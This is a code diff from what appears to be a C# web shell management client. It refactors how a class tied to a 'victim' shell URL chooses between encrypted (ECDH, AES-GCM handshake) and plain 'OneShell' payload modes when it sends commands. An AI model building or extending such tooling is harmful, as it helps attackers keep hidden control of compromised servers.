@@ -19,7 +19,6 @@ namespace Alien
         public clsVictim m_victim { get; set; }
         public HttpClient m_clnt { get; set; }
 
-        private bool m_bUseCrypto { get; init; }
         private AesGcm m_aesgcm { get; set; }
         private string m_szSessionToken { get; set; }
         private bool bTokenExisted { get; set; }
@@ -108,8 +107,6 @@ namespace Alien
             {
                 BaseAddress = new Uri(m_victim.ShellURL),
             };
-
-            m_bUseCrypto = m_victim.m_ShellConfig.payloadType == enPayloadType.Crypto;
         }
 
         private static readonly JsonSerializerOptions s_jsonOpts = new()
@@ -198,7 +195,7 @@ namespace Alien
             try
             {
                 // Encryption is enabled
-                if (m_bUseCrypto)
+                if (m_victim.ShellPayloadType == enPayloadType.ECDH)
                 {
                     // Handshake
                     if (!bTokenExisted)
@@ -322,7 +319,7 @@ namespace Alien
 
                 //MessageBox.Show(szRespContent);
 
-                if (!m_bUseCrypto)
+                if (m_victim.ShellPayloadType == enPayloadType.OneShell)
                 {
                     szSplitter = $"[{szSplitter}]";
 
@@ -508,7 +505,7 @@ namespace Alien
             string szSplitter = clsEzData.fnszGenerateRandomStr();
             string szPayload = fnGetPayload(szPayloadName, szSplitter);
 
-            if (m_bUseCrypto)
+            if (m_victim.ShellPayloadType == enPayloadType.ECDH)
             {
                 for (int i = 0; i < asParams.Length; i++)
                 {
